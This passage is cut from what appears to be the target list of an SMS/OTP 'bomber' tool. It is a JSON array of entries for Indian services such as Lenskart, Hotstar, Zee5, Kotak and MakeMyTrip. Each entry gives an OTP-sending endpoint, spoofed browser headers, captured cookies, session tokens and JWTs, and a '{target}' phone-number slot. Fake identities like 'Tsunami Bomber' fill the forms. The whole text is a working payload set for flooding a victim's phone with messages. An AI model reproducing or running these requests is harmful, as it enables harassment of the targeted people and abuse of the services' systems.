cto_bundle=B7YX1V9xWSUyRldtWUJzY1VIWGlhOHphUDlBTiUyQjZFcUNVeG0zQkx5d3RRQ3owTjl6SWJPOXhrcDlEWnZYRU56VXV4RG4wS0M3TG51amtLclhqMzUxclpzR3lPVjdIQnVJWkJBJTJCRSUyQm9XQ1JZRUp1cWZkWGhOaHV1UmMya2RKcnZGSGFQQ3NDWFB6Y0YlMkZONExtJTJCeFUwS3NneU95TnclM0QlM0Q; _pin_unauth=dWlkPVl6WXpNakF6TVRRdE0yUXpaaTAwTVRCa0xUZ3pNVE10TmpZNU5qTmhOMkZsTldZNSZycD1abUZzYzJV; _fbp=fb.1.1600762304817.979546076; _scid=930e7858-2b7d-47c6-a7b0-4306a8a4efa7; _gat_gtag_UA_130998589_1=1; _gat=1; _uetvid=4faf4aa86abe62cd3ce3e8cb0e169210; _uetsid=df92279395a7aff562f9f533491d5452; rec_sid=3795718099|1600762296; __bgvisit=1600762296137|admitad|aff|c91a7584326ca1bb44e73ab144f4861e|866755|0|2|null; _bg_w_c=b7a49103f1e175e2914b67e6ddb19ad5; installBGAPP=1; _gid=GA1.2.1887335251.1600762290; _ga=GA1.2.2008480368.1600762290; SearchWare=WyJ1c2EiLCJ1ayIsImhrIiwiYXUiLCJmciIsImd3dHIiLCJlcyIsInJ1IiwiY3oiLCJhZSJd; new_user=1; _gcl_au=1.1.1822847057.1600762288; __bgresource=affiliate; rec_uid=1578453606|1600762285; __bguser=1600762284904|1560641939780|1560641939780|1600762284904; __bgqueue=1600762284904|admitad|aff|c91a7584326ca1bb44e73ab144f4861e|866755|0|2|0|; __bgcookie=0|; countryCookie=%7B%22code%22%3Anull%2C%22name%22%3Anull%2C%22currency%22%3A%22INR%22%2C%22zone_id%22%3A%22%22%2C%22zone_code%22%3A%22%22%2C%22zone_name%22%3A%22%22%7D; currency=INR; _bgLang=en-GB; WebApp_SID=7f9e857355eff99028eb4e66c2d4e9d2"}, "json": {"_raw": "mobilePhone={target}&countryPhoneCode=91&type=1&verifyCode=KmUu"}},
    {"name": "XB_Lenskart_1", "url": "https://api.lenskart.com/v2/customers/sendOtp", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"origin": "https://www.lenskart.com", "x-b3-traceid": "991600776345288", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json;charset=UTF-8", "accept": "application/json, text/plain, */*", "cache-control": "no-cache, no-store", "x-session-token": "3bcac6f3-bda5-4370-8dc1-eebd8274b399", "x-api-client": "mobilesite", "referer": "https://www.lenskart.com/customer/account/login", "accept-language": "en-US"}, "json": {"telephone": "{target}"}},
    {"name": "XB_UrbanClap", "url": "https://www.urbanclap.com/api/v2/growth/profile/generateOTP", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json;charset=UTF-8", "accept": "application/json, text/plain, */*", "cache-control": "no-cache", "x-device-os": "web", "x-version-name": "web_v4.137.2", "save-data": "on", "x-client-key": "f4113c23a68c9cb3bf695c4490f9f3da9abc8674712f5b870906ec26bab7602aed85ad71640e8d9f785ea09db5a298a950b335adc5b8cbb6ce58209e2912eac6", "x-device-id": "ucuf1348-a14e179422-8c71-b87f-9eb1-edeca1376e-1600777338230", "x-version-code": "4.137.2", "origin": "https://www.urbancompany.com", "accept-language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"country_id": "IND", "phone": {"isd_code": "+91", "phone_wo_isd": "{target}"}, "device_type": "customer"}},
    {"name": "XB_Ajio_3", "url": "https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json", "Origin": "https://www.ajio.com", "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36", "content-type": "application/json", "Referer": "https://www.ajio.com/signup", "Accept-Language": "en-GB,en-US;q=0.8,en;q=0.6"}, "json": {"firstName": "Djdhdjsjsjsjsk", "login": "xjdjdosh@gmail.com", "password": "spider##1213", "genderType": "Female", "mobileNumber": "{target}", "requestType": "SENDOTP"}},
    {"name": "XB_Lenskart_2", "url": "https://api.lenskart.com/v2/customers/sendOtp", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"origin": "https://www.lenskart.com", "x-b3-traceid": "991603826710278", "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36", "content-type": "application/json;charset=UTF-8", "accept": "application/json, text/plain, */*", "cache-control": "no-cache, no-store", "x-session-token": "59dc2d84-55e6-4fc7-be6d-958b458ccd1e", "x-api-client": "mobilesite", "referer": "https://www.lenskart.com/customer/account/login", "accept-language": "en-GB,en-US;q=0.8,en;q=0.6"}, "json": {"telephone": "{target}"}},
    {"name": "XB_SonyLIV_2", "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120", "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDM4Mjc0NTEsImV4cCI6MTYwNTEyMzQ1MSwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.Pxfpv3puWt_4sbltsDa2UsmgeeSp30KK2lePV15-_AQ1dQ4Q6Iq6W2fKEpXUaz4WnXEMxIHTu4u7RRYjkp4SgKzuRFD4rMYyWxPBqdz2Xdsqp3eCYjza_re4bbJigWoF0X-X9Tue5D1wBjxr_XWlk9apED8gmzewR3SQnHgnFSf-TRqvb8v9nLofBcCLTLKs11yHDmZv8WN9Hi4G_xXxoRN1IqjqW4kHbXvw8hHxzyQZPAgmP18FZkJk62vHTUOcIa1cAFXrRl9yInqUj3UDaPVIJ4tu7XQGuTjn21iqusgWkXKtKnoeHftWrxbd645JeeBQik1b8qESSYCI1xMzD01eEcmaxaSP5abuCEMBGHmGIVwpyskiSwkBT-cuZe216i07XxZuaeo29mXrkuizNXfhAgZ1GvLD22rYOHt-PaGA-bKy_wHZv6ILf6Wt9XwuuxzroRKd_IS2Nl3pNMRzTl1UJ02uCTWw8RIdLFykiH3lBXSv4OkHMVUVJJp6KSSQHuH8Ejw3Zjag_rL2XkZvU7T9dT1ddforRk92_nuE96NTaj_UM-gb920oYoGBIxD-CoR5EvqbWlN4WzFF-AaV4auYobW9y1c0i-LiZrPE7dkDyuWSBsk1R-fBpTQDV2OhmbvWYiquurrKFhY5HFZy6bZ-Xrw_58mkn7-Ek0LaAEQ", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "accept": "application/json, text/plain, */*", "session_id": "1b3e01a7268d4aff933446f020e2f3ab-1603827494316", "x-via-device": "true", "app_version": "3.1.42.3", "origin": "https://www.sonyliv.com", "accept-language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"mobileNumber": "{target}", "channelPartnerID": "MSMIND", "country": "IN", "timestamp": "2020-10-27T19:39:13.355Z"}},
    {"name": "XB_Voot_2", "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json;charset=UTF-8", "origin": "https://www.voot.com", "referer": "https://www.voot.com/", "accept-language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"type": "mobile", "mobile": "+91{target}", "countryCode": "+91"}},
    {"name": "XB_Zee5", "url": "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={target}", "method": "GET", "origin": "", "identifier": "", "extra_headers": {"Accept": "*/*", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "Origin": "https://www.zee5.com", "Referer": "https://www.zee5.com/", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"}},
    {"name": "XB_AltBalaji_2", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMzkxNTgyNjcxMH0.xpvhIZb9W-sLsITPKBusMKguK_2WzIioXJSwAjtzCnU", "Content-Type": "application/json", "Origin": "https://www.altbalaji.com", "Referer": "https://www.altbalaji.com/", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"phone_number": "{target}", "country_code": "91", "platform": "web", "exp": 1603915826710}},
    {"name": "XB_Hotstar_2", "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", "method": "PUT", "origin": "", "identifier": "", "extra_headers": {"x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDQ0MzQ5NDUsImlhdCI6MTYwMzgzMDE0NSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiNDcuOS4xMjIuNDVcIixcImNvdW50cnlDb2RlXCI6XCJpblwiLFwiY3VzdG9tZXJUeXBlXCI6XCJudVwiLFwidHlwZVwiOlwiZ3Vlc3RcIixcImlzRW1haWxWZXJpZmllZFwiOmZhbHNlLFwiaXNQaG9uZVZlcmlmaWVkXCI6ZmFsc2UsXCJkZXZpY2VJZFwiOlwiZmFhODhmMDUtNzQzMi00MTAzLTk4ODYtN2JkOTM0ZjVjM2ExXCIsXCJwcm9maWxlXCI6XCJBRFVMVFwiLFwidmVyc2lvblwiOlwidjJcIixcInN1YnNjcmlwdGlvbnNcIjp7XCJpblwiOnt9fSxcImlzc3VlZEF0XCI6MTYwMzgzMDE0NTg4NH0iLCJ2ZXJzaW9uIjoiMV8wIn0.ATU4GrG4KucvkynhrFdg28qJ9LRwsN5MoWHlirRQsqo", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "x-hs-platform": "PCTV", "x-country-code": "IN", "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1", "hotstarauth": "st=1603830144~exp=1603836144~acl=/um/v3/*~hmac=cc2a715c0f26045e44e271d198ae382468d8a7dcb08825623016d6dcea06072d", "x-hs-appversion": "6.93.0", "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1", "accept": "*/*", "origin": "https://www.hotstar.com", "referer": "https://www.hotstar.com/", "accept-language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"phone_number": "{target}", "country_prefix": "91"}},
    {"name": "XB_Dream11_2", "url": "https://www.dream11.com/graphql/mutation/pwa/register", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "*/*", "device": "pwa", "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "origin": "https://www.dream11.com", "referer": "https://www.dream11.com/register?testcode=affpwa2&utm_source=VcomIndWeb&utm_medium=cpr&utm_campaign=98885&utm_content=20200919", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "WZRK_S_W4R-49K-494Z=%7B%22p%22%3A1%2C%22s%22%3A1602759175%2C%22t%22%3A1602759175%7D; dh_user_id=91c4edf0-0ed4-11eb-9f02-755b4004c50d; WZRK_G=dc2112f4850746a0b8b47c233471fe4a; ajs_anonymous_id=%2218835b7c-2e60-48c2-a6c4-79dc7e7c169a%22; G_ENABLED_IDPS=google; __csrf=fb1f1947-4547-392d-9a28-a9de30d9e766"}, "json": {"query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}", "variables": {"email": "tsunami@gmail.com", "mobileNumber": "{target}", "password": "tsunami@123astronomia"}}},
    {"name": "XB_Quikr", "url": "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept": "*/*", "origin": "https://www.quikr.com", "referer": "https://www.quikr.com/SignIn?redirect=https%3A%2F%2Fwww.quikr.com%2F", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "__utmb=119021961.4.9.1603857402954; _jk_id=ff9d1bcb-918d-49f4-bb9b-bb5a8f6628f7.1603857388.1.1603857388.; _fbp=fb.1.1603857388273.785408433; _gcl_au=1.1.1726929010.1603857388; __utmt=1; __utmz=119021961.1603857384.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmc=119021961; __utma=119021961.1718379111.1603857381.1603857384.1603857384.1; __redirectUrl=https%3A%2F%2Fwww.quikr.com%2F; _gat_quikrRUMTracker=1; _gat_quikrCrossCategoryRecommendationTracker=1; _gat_quikrPWATracker=1; utmztrack=utmcsr%3D%28direct%29%7Cutmccn%3D%28direct%29%7Cutmcmd%3D%28none%29; abRandMobile=23; _gid=GA1.2.355756152.1603857381; _ga=GA1.2.1718379111.1603857381; __at=eb75a6ee-1fbe-4f22-9b01-fc6fd80be4b0; brsampl=79253.79107; abRand=17; new_prefer_city=www; prefer_city_id=1"}, "json": {"_raw": "user={target}&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88&token=03AGdBq250swygN0BZpSQUIeR3kzgOs7dzUMwPxeC99DpmRiCqpfyUMLfFITJT6V6KAV8T94vfhY7IYg0Dg4DK5Vy8SEhGXg5XrKqRI1K6YqQwTOCWu9w6cwVSXhTXFXPraD6tYAumNW92Czo3wer9VOEmbYDZpvVVT3kgLzbFCPGu_BZjakj6dF1LkyajBiiWDqSiV15D73atPRfUdo_7CAjBrtzEyyKorYztttEWIhqMI-wKXL_EGtyDAhDRVnQKIjKvMzW4vVYSUWiQ5ffKM7KUlNvy8QJAIYD-3sJ-TT9mD5WP1KgPuw8dbyDvLFv36q7-IDMJYWU0nZXa6Ot8rVPqqqAkCZcoCcLcCHPFGj_pheOOkoEEo7E022NTJBPHxXUVA7fJP8zqXFWjajX0ljFT6iZj5qB5yEOviiTj1kTtt1xmfea7Zs7WtwV9QKd5ytbheE-VUAxoFcRff-6zXSSerEXVdwv892fnnhSVbYWH3pABRoyr2Wh1RVBpYREY8fYihyu9V358&v3=true"}},
    {"name": "XB_Kotak_1", "url": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.kotak.com", "Referer": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8", "Cookie": "JSESSIONID=0000P-ep34ciOrPvp1ymnR48y_E:-1; NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0=ffffffff09023da045525d5f4f58455e445a4a42150c; _gcl_au=1.1.1243881610.1603857484; WZRK_G=7ce1a924d4324651b5060fb3eb9c1e87; WZRK_S_W4W-5K7-K75Z=%7B%22p%22%3A1%2C%22s%22%3A1603857484%2C%22t%22%3A1603857484%7D; _ga=GA1.2.494540412.1603857484; _gid=GA1.2.844884659.1603857484; _uetsid=c7f02f4018d111ebb67e1da217874a38; _uetvid=c7f28de018d111eb8cbb5dd28b9f9334; _fbp=fb.1.1603857484947.174573870; _dc_gtm_UA-4203568-53=1; _gat_UA-4203568-53=1; _gat_UA-4203568-59=1; _hjTLDTest=1; _hjid=a83b36d7-433b-41f6-8ede-161af7e27204; _hjAbsoluteSessionInProgress=0; _gaexp=GAX1.2.kNrNERU2Qx2igfIj9Nwmtw.18644.1; _gat_gtag_UA_4203568_53=1"}, "json": {"_raw": "cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={target}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes"}},
    {"name": "XB_Kotak_2", "url": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/resend-otp0on-call.action?SWNToken=1603857646468&flw=vkyc", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"Accept": "application/json, text/javascript, */*; q=0.01", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.kotak.com", "Referer": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/otp-mobile.action?SWNToken=1603857646468&flw=vkyc", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8", "Cookie": "JSESSIONID=0000P-ep34ciOrPvp1ymnR48y_E:-1; NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0=ffffffff09023da045525d5f4f58455e445a4a42150c; _gcl_au=1.1.1243881610.1603857484; WZRK_G=7ce1a924d4324651b5060fb3eb9c1e87; _ga=GA1.2.494540412.1603857484; _gid=GA1.2.844884659.1603857484; _fbp=fb.1.1603857484947.174573870; _hjTLDTest=1; _hjid=a83b36d7-433b-41f6-8ede-161af7e27204; _hjAbsoluteSessionInProgress=0; _dc_gtm_UA-4203568-53=1; _gat_UA-4203568-53=1; _gat_UA-4203568-59=1; _gaexp=GAX1.2.kNrNERU2Qx2igfIj9Nwmtw.18644.1!ewD-u9AjS-WPbaOPvAM_cw.18641.1; _gat_gtag_UA_4203568_53=1; WZRK_S_W4W-5K7-K75Z=%7B%22p%22%3A4%2C%22s%22%3A1603857484%2C%22t%22%3A1603857661%7D; _uetsid=c7f02f4018d111ebb67e1da217874a38; _uetvid=c7f28de018d111eb8cbb5dd28b9f9334"}},
    {"name": "XB_Cuemath_2", "url": "https://www.cuemath.com/api/v4/parents/", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/JSON", "accept": "*/*", "origin": "https://www.cuemath.com", "referer": "https://www.cuemath.com/parent/signup/?", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "cookieconsent_status=dismiss; _CEFT=Q%3D%3D%3D; _fbp=fb.1.1603882875848.1161506818; _uetvid=e5a9c120190c11eba48bfd200f8a14a3; _uetsid=e5a5ac70190c11ebbbd2895d4b869731; AF_BANNERS_SESSION_ID=1603882874676; _dc_gtm_UA-75184559-1=1; cue_gacid=543040074.1603882874; _gid=GA1.2.310046842.1603882874; _ga=GA1.2.543040074.1603882874; _gcl_au=1.1.109511992.1603882873; landing_page=%2F; referrer=https%3A%2F%2Fwww.google.com%2F; cue_country_code=j%3Anull; __cfduid=dbfb990bb3a6f23fba926d9894a45d9351603882867"}, "json": {"intl_mobile": {"phone": "{target}"}, "notify": ["notify_on_whatsapp"], "phone": "{target}", "email": "tsunami@gmail.com", "full_name": "Tsunami Bomber", "timezone": "Asia/Calcutta", "notify_through": "notify_on_whatsapp", "form_fields": "full_name,email,intl_mobile"}},
    {"name": "XB_RedBus_2", "url": "https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined", "method": "GET", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "referer": "https://m.redbus.in/preregister", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "InsuranceSelectionMandatoryAB=true; _gaexp=GAX1.2.ydiJq7nqRp2qwH9bGeJ7iA.18643.1; AMP_TOKEN=%24RETRIEVING; _dc_gtm_UA-9782412-15=1; bm_sv=9E28BBBC7C50B7C4696B372D8BAC57DD~FujGt6Eg0nVxRjbs7w16SYQxRrn4ibS6C4O35nNI46Wa54pu8oLqBL+8LXCBXSu+qNLsaA2z3EhBQ2NJOGFgZQOFJni0ltCOTwkdIBEWFLvWXJqyjP9aBobJWXAb033QYLekls1QUUPTHpXX/N6Z3qfl2T+jfIWZn2/L+BMMEWk=; tvc_user_type=new; _gat_UA-9782412-15=1; _gid=GA1.3.500450699.1603883075; _ga=GA1.3.1053631502.1603883075; tvc_session_alive_bus=1; tvc_smc_bus=google / organic / (not set); onetap=1; browserDetailLogged=true; ak_bmsc=62C933CFC108F5A7DB2E4DB99B81A517312C8DB7255F00003F50995F653B6B3A~pl0AUU7E0Y4mYuTnusgXPCAIx3wuJ0BKA4VoJxFOPMnHcyqkHjYGhu/zJlnq2f7ZekdNEepf+qicaUQJTv9mpALDXDYb+qwnDAp0isRSh0hNxaJX80eZsoXaS9ll2J8wOxBEKPCWqckjgfKPKuj0F5RvI99oEaWFShskRvKwAib8OottTL3nAl3w1R+xZ17DeOhUJkdXgIoRrXeU1351r9DlzO6LVO9dpdPSm6W0VB+yk=; rbuuid=5abc9630-190d-11eb-9b77-b99a83976b59; selectedCurrency=INR; language=en; defaultlanguage=en; currency=INR; country=IND; country_ISO=IN"}},
    {"name": "XB_HappyEasyGo", "url": "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{target}&verifycode=FDCA", "method": "GET", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/plain, */*", "x-device": "mobile", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "referer": "https://m.happyeasygo.com/register", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "G_ENABLED_IDPS=google; _gat_UA-93580804-7=1; _uetvid=50664fb0190e11ebb0434db0b4466b92; _uetsid=50641740190e11eb93bb73bbfb574f40; refurl=; _gac_UA-93580804-2=1.1603883483.Cj0KCQjwreT8BRDTARIsAJLI0KKh4tcoeyPvkF1sGzrrthbqsRK0aP8Ja1mQhWtGywII0KMC86A4pnkaAvgnEALw_wcB; _gid=GA1.2.1298233779.1603883483; _ga=GA1.2.2010415513.1603883483; deviceId=96146d25-169e-4be3-a11e-de78b43c37fd; _fbp=fb.1.1603883483792.1510659266; _gac_UA-93580804-2=1.1603883483.Cj0KCQjwreT8BRDTARIsAJLI0KKh4tcoeyPvkF1sGzrrthbqsRK0aP8Ja1mQhWtGywII0KMC86A4pnkaAvgnEALw_wcB; _gid=GA1.3.1298233779.1603883483; _ga=GA1.3.2010415513.1603883483; _gcl_au=1.1.417055803.1603883482; _gcl_aw=GCL.1603883482.Cj0KCQjwreT8BRDTARIsAJLI0KKh4tcoeyPvkF1sGzrrthbqsRK0aP8Ja1mQhWtGywII0KMC86A4pnkaAvgnEALw_wcB"}},
    {"name": "XB_MakeMyTrip", "url": "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"deviceid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f", "currency": "inr", "language": "eng", "authorization": "h4nhc9jcgpAGIjp", "visitor-id": "a3d2f892-af4d-40d1-808a-db6286b8fe1f", "region": "in", "accept": "application/json", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "user-identifier": "{\"ipAddress\":\"ipAddress\",\"imie\":\"imie\",\"appVersion\":\"2.0.0\",\"deviceId\":\"a3d2f892-af4d-40d1-808a-db6286b8fe1f\",\"os\":\"PWA\",\"osVersion\":\"osVersion\",\"timeZone\":\"timeZone\",\"type\":\"mmt-auth\",\"value\":null}", "vid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f", "tid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f", "origin": "https://www.makemytrip.com", "referer": "https://www.makemytrip.com/", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "s_sess=%20s_cmp_pages%3DSEM%257CM%257CDF%257CG%257CBrand%257CB_M_Makemytrip_Search_Exact%257CBrand_Top_5_Exact%257CExpanded%257C456320328656%3B%20cf%3D0%3B%20s_cc%3Dtrue%3B%20tp%3D676%3B%20s_ppv%3Dmbls_login_main_page%252C100%252C100%252C676%3B%20s_sq%3D%3B; s_pers=%20s_vnum%3D1604169000439%2526vn%253D1%7C1604169000439%3B%20s_depth%3D2%7C1603885492899%3B%20s_lv%3D1603883718996%7C1698491718996%3B%20s_lv_s%3DFirst%2520Visit%7C1603885518996%3B%20gpv_pn%3Dmbls_login_main_page%7C1603885519074%3B%20s_invisit%3Dtrue%7C1603885519097%3B%20s_nr3650%3D1603883719122-New%7C1919243719122%3B%20s_nr30%3D1603883719143-New%7C1606475719143%3B%20s_nr120%3D1603883719165-New%7C1614251719165%3B%20s_nr7%3D1603883719184-New%7C1604488519184%3B; bm_sv=C55140AA532E879E48FCE510EE4D7DFF~ar2Vkg/OEbzM/D2nEqG/q8NfolxN2lT4jdwuq9kbaw6Tuq5FQYggkN0oj238T8DDz8B9tjhoS7x+gAeJZEYuk6pS7CoFG1ngKE98ixgNFYuy5rZmzgRRGnApQMkkSPSL72SPF8hOh7H36cQSSdSBxqwEQ7zqNHoNcmk64t8iRfg=; _adck_id=4fdb6d7c-9cc8-41f2-8a93-b1b6f24b2979; _adserveruser_ad_id=null; _abck=49DFEEA10F4B82F89F83D09A62D84093~0~YAAQ1I0sMV3UOF51AQAAEx7qbgR+qzQDIDykr/YDveVroz7mYwgAaZxdGb4DKZI+XVXbqxnMwvLUNljt0F+sBTCuNX2s+rCcOZX42twjRBXH01LU8XmNd6Zufo5oiukzBKZOnOeMgbrmNr14BDQ/GLLjzCil125zxH+ak99ZI+eFo7BMlvC1WNwjhKOLCYA4O6Qson1O1nk3CorsBYDcqWOJpKAjmz8uaWmxdOz7hRJWoWKZ+uTPwM2Crf1SLmbiHMyzdSZlUIbyiLP55CZu/9DRccG6d3zhbH/BXDCFsQS+8xtZTEzD+NOaxEeIwoNuP5p1Y+Q+dmtt8IQ=~-1~||-1||~-1; AMCV_1E0D22CE527845790A490D4D%40AdobeOrg=-1712354808%7CMCIDTS%7C18564%7CMCMID%7C69122668996877728323838859128273339164%7CMCAAMLH-1604488429%7C12%7CMCAAMB-1604488429%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1603890831s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C4.3.0; fltTab=0; s_ecid=MCMID%7C69122668996877728323838859128273339164; AMCVS_1E0D22CE527845790A490D4D%40AdobeOrg=1; __gads=ID=4141333fb27e4dcd-226b07d86cc400a7:T=1603883628:RT=1603883628:S=ALNI_MYC4HXzq54mQHuH7P1shgEPYe8btg; 